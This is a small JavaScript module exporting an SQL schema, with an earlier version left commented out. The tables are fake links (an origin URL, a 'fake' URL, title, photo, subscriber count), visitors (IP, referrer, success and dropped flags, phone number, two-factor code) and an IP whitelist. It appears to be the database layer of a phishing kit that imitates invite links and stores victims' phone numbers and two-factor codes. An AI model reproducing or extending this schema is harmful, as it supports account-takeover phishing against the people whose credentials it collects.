/*const prescript = `
CREATE TABLE IF NOT EXISTS link (
    id TEXT PRIMARY KEY,
    origin TEXT NOT NULL,
    fake TEXT NOT NULL,
    photo TEXT NOT NULL,
    title TEXT NOT NULL,
    subscribers INTEGER NOT NULL,
    description TEXT,
    visits INTEGER NOT NULL DEFAULT 0
);
CREATE TABLE IF NOT EXISTS visitor (
    id TEXT PRIMARY KEY,
    refer TEXT NOT NULL,
    timestamp TEXT NOT NULL,
    ip TEXT NOT NULL
);
`;*/

const prescript = `
CREATE TABLE IF NOT EXISTS whitelistIp (
    ip TEXT PRIMARY KEY NOT NULL
);
CREATE TABLE IF NOT EXISTS link (
    id TEXT PRIMARY KEY,
    origin TEXT NOT NULL,
    photo TEXT NOT NULL,
    title TEXT NOT NULL, 
    subscribers INTEGER NOT NULL,
    description TEXT,
    tag TEXT NOT NULL,
    status TEXT NOT NULL
);
CREATE TABLE IF NOT EXISTS visitor (
    id TEXT PRIMARY KEY,
    refer TEXT NOT NULL,
    timestamp TEXT NOT NULL,
    success_timestamp TEXT,
    dropped BOOL DEFAULT 0,
    success BOOL DEFAULT 0,
    ip TEXT NOT NULL,   
    twofa TEXT,
    phone TEXT
);
`;

module.exports = prescript;
